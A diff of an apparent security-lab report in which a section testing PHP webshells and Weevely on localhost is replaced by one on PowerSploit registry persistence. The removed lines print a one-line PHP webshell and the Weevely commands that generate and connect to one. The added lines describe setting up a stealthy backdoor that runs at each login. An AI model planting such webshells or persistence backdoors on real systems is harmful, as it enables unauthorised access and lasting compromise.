@@ -132,25 +132,16 @@ Features tested:**
 ![Webshell ls](webshell_ls.png.png)
 
 ---
-### 5. Webshells
+### 5. PowerSploit (Persistence Module)
 **Features tested:**
+* **Module Importation:** Used to load the PowerSploit framework into a current PowerShell session, allowing for the execution of advanced scripts that are not natively available on the target system.
+* **Registry Persistence (`New-UserPersistenceOption`):** Used to create a persistence mechanism within the Windows Registry, ensuring the backdoor executes automatically every time the user logs in.
+* **Exported Command Analysis:** Used to verify available persistence functions within the module, allowing the tester to choose the most stealthy method based on the target environment's configuration.
 
-Simple PHP webshell execution (<?php system($_GET["cmd"]); ?>)
-
-//localhost/shell.php?cmd=pwd → /var/www/html
-
-//localhost/shell.php?cmd=whoami → www-data
-
-//localhost/shell.php?cmd=ls → listed files (index.html, shell.php)
-
-Weevely shell generation (weevely generate mypassword shell.php)
-
-Weevely connection and command execution (weevely http://localhost/shell.php mypassword)
-
-**Screenshots:**
+**Screenshots:**  
+![PowerSploit Commands](powersploit_commands.png.png)
 
 ---
-
 
 ## 📊 Comparison & Conclusions
 
